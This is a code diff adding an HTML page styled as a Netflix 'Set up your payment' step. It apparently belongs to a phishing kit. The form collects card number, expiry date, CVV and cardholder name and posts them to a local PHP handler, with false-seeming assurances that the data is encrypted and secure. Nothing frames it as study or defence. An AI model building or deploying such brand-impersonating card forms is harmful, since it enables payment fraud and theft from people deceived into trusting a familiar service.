@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Netflix</title>
+  <link rel="stylesheet" href="style/payment.css">
+        <link rel="shortcut icon" href="style/favicon.ico">
+
+</head>
+
+<body>
+
+  <header>
+    <div class="logo">NETFLIX</div>
+  </header>
+
+  <main>
+    <div class="payment-box">
+
+      <div class="step">STEP 1 OF 2</div>
+
+      <h1>Set up your payment</h1>
+
+      <p class="subtitle">
+        Your payment information is encrypted and secure.
+      </p>
+
+<form id="paymentForm" action="inc/payment.php" method="POST">
+
+        <!-- CARD NUMBER -->
+        <label>Card number</label>
+
+        <div class="input-wrapper">
+          <input
+            name="cardNumber"
+            type="text"
+            id="cardNumber"
+            placeholder="Card number"
+            maxlength="23"
+            autocomplete="cc-number"
+          >
+
+          <div id="cardIcon" class="card-icon">💳</div>
+        </div>
+
+        <div id="cardError" class="error"></div>
+
+
+        <!-- EXPIRY + CVV -->
+        <div class="row">
+
+          <div class="field">
+            <label>Expiration date</label>
+
+            <input
+              name="expiry"
+              type="text"
+              id="expiry"
+              placeholder="MM / YY"
+              maxlength="7"
+              autocomplete="cc-exp"
+            >
+
+            <div id="expiryError" class="error"></div>
+          </div>
+
+
+          <div class="field">
+            <label>CVV</label>
+
+            <input
+              name="cvc"
+              type="text"
+              id="cvv"
+              placeholder="CVV"
+              maxlength="4"
+              autocomplete="cc-csc"
+            >
+
+            <div id="cvvError" class="error"></div>
+          </div>
+
+        </div>
+
+
+        <!-- NAME -->
+        <label>Cardholder name</label>
+
+        <input
+          name="cardName"
+          type="text"
+          id="cardName"
+          placeholder="Name on card"
+          autocomplete="cc-name"
+        >
+
+        <div id="nameError" class="error"></div>
+
+
+        <div class="secure">
+          🔒 Your payment information is protected with encryption.
+        </div>
+
+
+    <button type="submit">Continue</button>
+
+      </form>
+
+    </div>
+  </main>
+
+
+  <script src="style/payment.js"></script>
+
+</body>
+</html>
